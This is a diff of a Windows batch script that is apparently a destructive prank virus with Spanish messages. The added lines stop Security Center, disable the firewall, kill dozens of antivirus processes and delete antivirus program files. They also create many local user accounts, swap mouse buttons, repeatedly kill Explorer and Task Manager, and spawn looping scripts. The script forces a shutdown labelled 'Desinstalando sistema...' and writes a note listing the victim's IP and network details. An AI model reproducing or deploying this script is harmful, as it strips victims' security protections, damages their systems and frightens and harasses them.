@@ -14,8 +14,8 @@
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
 ::YxY4rhs+aU+IeA==
-::cxY6rQJ7JhzQF1fEqQJiZk8aHErSXA==
-::ZQ05rAF9IBncCkqN+0xwdVsGAlDMbCXqZg==
+::cxY6rQJ7JhzQF1fEqQJiZk4aHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsGAlHMbCXqZg==
 ::ZQ05rAF9IAHYFVzEqQIWAzJmeTfi
 ::eg0/rx1wNQPfEVWB+kM9LVsJDCKJNXmvFdU=
 ::fBEirQZwNQPfEVWB+kM9LVsJDAKJNXmvFdU=
@@ -27,7 +27,7 @@
 ::Zg8zqx1/OA3MEVWAtB9wZns=
 ::dhA7pRFwIByZRRnKlA==
 ::Zh4grVQjdCyDJGyX8VAjFC5aRwqNK1eeCaIS5Of66/m7hGYrXfAqa7P98YKHMvUApED8cPY=
-::YB416Ek+ZG8=
+::YB416Ek+ZW8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
@@ -35,17 +35,172 @@
 mode 30 , 01
 powershell -window minimized -command "" 
 TASKKILL /F /IM EXPLORER.EXE
-start explorer.exe
+start
+start
+start
+start
+net stop “Security Center”
+netsh firewall set opmode mode=disable
+tskill /A av*
+tskill /A fire*
+tskill /A anti*
+cls
+tskill /A spy*
+tskill /A bullguard
+tskill /A PersFw
+tskill /A KAV*
+tskill /A ZONEALARM
+tskill /A SAFEWEB
+cls
+tskill /A spy*
+tskill /A bullguard
+tskill /A PersFw
+tskill /A KAV*
+tskill /A ZONEALARM
+tskill /A SAFEWEB
+cls
+tskill /A OUTPOST
+tskill /A nv*
+tskill /A nav*
+tskill /A F-*
+tskill /A ESAFE
+tskill /A cle
+cls
+tskill /A BLACKICE
+tskill /A def*
+tskill /A kav
+tskill /A kav*
+tskill /A avg*
+tskill /A ash*
+cls
+tskill /A aswupdsv
+tskill /A ewid*
+tskill /A guard*
+tskill /A guar*
+tskill /A gcasDt*
+tskill /A msmp*
+cls
+tskill /A mcafe*
+tskill /A mghtml
+tskill /A msiexec
+tskill /A outpost
+tskill /A isafe
+tskill /A zap*cls
+tskill /A zauinst
+tskill /A upd*
+tskill /A zlclien*
+tskill /A minilog
+tskill /A cc*
+tskill /A norton*
+cls
+tskill /A norton au*
+tskill /A ccc*
+tskill /A npfmn*
+tskill /A loge*
+tskill /A nisum*
+tskill /A issvc
+tskill /A tmp*
+cls
+tskill /A tmn*
+tskill /A pcc*
+tskill /A cpd*
+tskill /A pop*
+tskill /A pav*
+tskill /A padmincls
+tskill /A panda*
+tskill /A avsch*
+tskill /A sche*
+tskill /A syman*
+tskill /A virus*
+tskill /A realm*cls
+tskill /A sweep*
+tskill /A scan*
+tskill /A ad-*
+tskill /A safe*
+tskill /A avas*
+tskill /A norm*
+cls
+tskill /A offg*
+del /Q /F C:\Program Files\alwils~1\avast4\.
+del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
+del /Q /F C:\Program Files\kasper~1\*.exe
+cls
+del /Q /F C:\Program Files\trojan~1\*.exe
+del /Q /F C:\Program Files\f-prot95\*.dll
+del /Q /F C:\Program Files\tbav\*.datcls
+del /Q /F C:\Program Files\avpersonal\*.vdf
+del /Q /F C:\Program Files\Norton~1\*.cnt
+del /Q /F C:\Program Files\Mcafee\.
+cls
+del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\.
+del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\.
+del /Q /F C:\Program Files\Norton~1\Norton~1\.
+del /Q /F C:\Program Files\Norton~1\.
+cls
+del /Q /F C:\Program Files\avgamsr\*.exe
+del /Q /F C:\Program Files\avgamsvr\*.exe
+del /Q /F C:\Program Files\avgemc\*.exe
+cls
+del /Q /F C:\Program Files\avgcc\*.exe
+del /Q /F C:\Program Files\avgupsvc\*.exe
+del /Q /F C:\Program Files\grisoft
+del /Q /F C:\Program Files\nood32krn\*.exe
+del /Q /F C:\Program Files\nood32\*.exe
+cls
+del /Q /F C:\Program Files\nod32
+del /Q /F C:\Program Files\nood32
+del /Q /F C:\Program Files\kav\*.exe
+del /Q /F C:\Program Files\kavmm\*.exe
+del /Q /F C:\Program Files\kaspersky\.
+cls
+del /Q /F C:\Program Files\ewidoctrl\*.exe
+del /Q /F C:\Program Files\guard\*.exe
+del /Q /F C:\Program Files\ewido\*.exe
+cls
+del /Q /F C:\Program Files\pavprsrv\*.exe
+del /Q /F C:\Program Files\pavprot\*.exe
+del /Q /F C:\Program Files\avengine\*.exe
+cls
+del /Q /F C:\Program Files\apvxdwin\*.exe
+del /Q /F C:\Program Files\webproxy\*.exe
+del /Q /F C:\Program Files\panda
+software\.
 cd C:\Users\%username%\Desktop
 echo X=MsgBox(".........................",0+48,".") >> hhhh.vbs
 start
 start
-start
-start
-start
-start
 start 
 start hhhh.vbs 
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
 start hhhh.vbs 
 start hhhh.vbs 
 TASKKILL /F /IM EXPLORER.EXE
@@ -64,7 +219,7 @@ echo #$PositionChange >> Mouse.ps1
 echo $i >> Mouse.ps1
 echo }  >> Mouse.ps1
 echo "#> >> Mouse.ps1
-echo powershell.exe -ExecutionPolicy Bypass -File "C:\Users\%username%\Desktop\Mouse.ps1" >> M0US3rrR.bat 
+echo powershell.exe -ExecutionPolicy Bypass -File "Mouse.ps1" >> M0US3rrR.bat 
 start M0US3rrR.bat 
 start
 start explorer.exe
@@ -128,21 +283,13 @@ echo Dim speaks, speech >> n.vbs
 echo speaks="jajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajaja" >> n.vbs
 echo Set speech=CreateObject("sapi.spvoice") >> n.vbs
 echo speech.Speak speaks >> n.vbs
+start n.vbs
+start n.vbs
+start n.vbs
+start n.vbs
 cd C:\Users\%username%\Desktop
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 echo Set wshShell =wscript.CreateObject("WScript.Shell") >> kbm.vbs
 echo do >> kbm.vbs
@@ -151,25 +298,8 @@ echo wshshell.sendkeys "{CAPSLOCK}" >> kbm.vbs
 echo wshshell.sendkeys "{NUMLOCK}" >> kbm.vbs
 echo wshshell.sendkeys "{SCROLLLOCK}" >> kbm.vbs
 echo loop >> kbm.vbs
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
 TASKKILL /F /IM EXPLORER.EXE
-start explorer.exe
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
-cd C:\Users\%username%\Desktop
 start kbm.vbs
-cd C:\Users\%username%\Desktop
 echo @echo off >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
@@ -185,6 +315,7 @@ echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+start explorer.exe
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
@@ -204,9 +335,6 @@ start ppppppppppppppp.bat
 echo @echo off >> s44ss1541DDDDD44.bat
 echo rundll32.exe user32.dll,MessageBeep >> s44ss1541DDDDD44.bat
 echo exit >> s44ss1541DDDDD44.bat
-cd C:\Users\%username%\Desktop
-
-cd C:\Users\%username%\Desktop
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -405,7 +533,6 @@ TASKKILL /F /IM EXPLORER.EXE
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
 START EXPLORER.EXE
-
 TASKKILL /F /IM TASKMGR.EXE
 start
 start
@@ -416,14 +543,12 @@ start s44ss1541DDDDD44.bat
 start explorer.exe
 GOTO RE8
 
-
 :RE8
 start
 start
 title %Random%
 md hola %Username%
 md hola 
-
 CLS
 Rundll32 user32,SwapMouseButton
 TASKKILL /F /IM EXPLORER.EXE
@@ -444,7 +569,6 @@ start
 msg * Hola %username%
 Rundll32 user32,SwapMouseButton
 TASKKILL /F /IM EXPLORER.EXE
-
 start ppppppppppppppp.bat
 START EXPLORER.EXE
 TASKKILL /F /IM TASKMGR.EXE
@@ -469,78 +593,77 @@ start explorer.exe
 start
 start ppppppppppppppp.bat
 start
-shutdown.exe -s -t 30 -c "........................................................."
+shutdown.exe -s -t 15 -c "Desinstalando sistema..."
 cd C:\Users\%username%\Desktop
-
-md NoConfiesEnGenteDeInternet
-md NoConfiesEnGenteDeInternet2
-md NoConfiesEnGenteDeInternet3
-md NoConfiesEnGenteDeInternet4
-md NoConfiesEnGenteDeInternet5
-md NoConfiesEnGenteDeInternet6
-md NoConfiesEnGenteDeInternet7
-md NoConfiesEnGenteDeInternet8
-md NoConfiesEnGenteDeInternet9
-md NoConfiesEnGenteDeInternet9
-md NoConfiesEnGenteDeInternet10
-md NoConfiesEnGenteDeInternet11
-md NoConfiesEnGenteDeInternet12
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
-md NoConfiesEnGenteDeInternet13
-md NoConfiesEnGenteDeInternet14
-md NoConfiesEnGenteDeInternet15
-md NoConfiesEnGenteDeInternet16
-md NoConfiesEnGenteDeInternet17
-md NoConfiesEnGenteDeInternet18
-md NoConfiesEnGenteDeInternet19
-md NoConfiesEnGenteDeInternet20
-md NoConfiesEnGenteDeInternet21
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
 start ppppppppppppppp.bat
-md NoConfiesEnGenteDeInternet22
-md NoConfiesEnGenteDeInternet23
-md NoConfiesEnGenteDeInternet24
-md NoConfiesEnGenteDeInternet25
-md NoConfiesEnGenteDeInternet26
-md NoConfiesEnGenteDeInternet27
-md NoConfiesEnGenteDeInternet28
-md NoConfiesEnGenteDeInternet29
-md NoConfiesEnGenteDeInternet30
-md NoConfiesEnGenteDeInternet31
-md NoConfiesEnGenteDeInternet32
-md NoConfiesEnGenteDeInternet33
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
-md NoConfiesEnGenteDeInternet34
-md NoConfiesEnGenteDeInternet35
-md NoConfiesEnGenteDeInternet36
-md NoConfiesEnGenteDeInternet37
-md NoConfiesEnGenteDeInternet38
-md NoConfiesEnGenteDeInternet39
-md NoConfiesEnGenteDeInternet40
-md NoConfiesEnGenteDeInternet41
-md NoConfiesEnGenteDeInternet42
-md NoConfiesEnGenteDeInternet43
-md NoConfiesEnGenteDeInternet44
-md NoConfiesEnGenteDeInternet45
-md NoConfiesEnGenteDeInternet46
-md NoConfiesEnGenteDeInternet47
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
-md NoConfiesEnGenteDeInternet48
-md NoConfiesEnGenteDeInternet49
-md NoConfiesEnGenteDeInternet50
-md NoConfiesEnGenteDeInternet51
-md NoConfiesEnGenteDeInternet52
-md NoConfiesEnGenteDeInternet53
-md NoConfiesEnGenteDeInternet54
-md NoConfiesEnGenteDeInternet55
-md NoConfiesEnGenteDeInternet56
-md NoConfiesEnGenteDeInternet57
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
 start ppppppppppppppp.bat
-md NoConfiesEnGenteDeInternet58
-md NoConfiesEnGenteDeInternet59
-md NoConfiesEnGenteDeInternet60
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
+md NoConfiesEnGenteDeInternet%random%
 cd C:\Users\%username%\Desktop
 echo @echo on >> s2.bat
 echo color a >> s2.bat
@@ -673,23 +796,25 @@ start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
-cd C:\ 
-md WWbbbkk
-cd C:\WWbbbkk 
 echo Function Set-WallPaper($Value) >> KKKKllkjsdi.ps1
 echo { >> KKKKllkjsdi.ps1
 echo Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $value >> KKKKllkjsdi.ps1 
 echo rundll32.exe user32.dll, UpdatePerUserSystemParameters >> KKKKllkjsdi.ps1 
 echo } ">> KKKKllkjsdi.ps1  
-echo Set-WallPaper -value C:\Windows\System32\@language_notification_icon.png >> KKKKllkjsdi.ps1  
-echo rundll32.exe user32.dll, UpdatePerUserSystemParameters >> KKKKllkjsdi.ps1  
-powershell.exe -ExecutionPolicy Bypass -File "C:\WWbbbkk\KKKKllkjsdi.ps1" 
+echo Set-WallPaper -value C:\Windows\WinSxS\x86_netfx4-aspnet_webadmin_images_b03f5f7f11d50a3a_4.0.15805.0_none_7ab11546ceb3decd\help.jpg >> KKKKllkjsdi.ps1  
+powershell.exe -ExecutionPolicy Bypass -File "\KKKKllkjsdi.ps1" 
 rundll32.exe user32.dll, UpdatePerUserSystemParameters 
 rundll32.exe user32.dll, UpdatePerUserSystemParameters 
 rundll32.exe user32.dll, UpdatePerUserSystemParameters 
 rundll32.exe user32.dll, UpdatePerUserSystemParameters 
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
+net user unknow%random% /add
 start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
 start s44ss1541DDDDD44.bat
@@ -732,10 +857,10 @@ start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
 start s44ss1541DDDDD44.bat
-cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+cd C:\Users\Unknow\Desktop
 echo Tenemos tu ip: >> Abrime.txt
 ipconfig | Find "IPv4" >> Abrime.txt
-echo Tu nombre de usuario: %username% >> Abrime.txt
+echo Tu nombre: %username% >> Abrime.txt
 echo - >> Abrime.txt
 echo Incluso tenemos toda esta informacion: >> Abrime.txt
 echo Informacion completa de la red Conectada: >> Abrime.txt
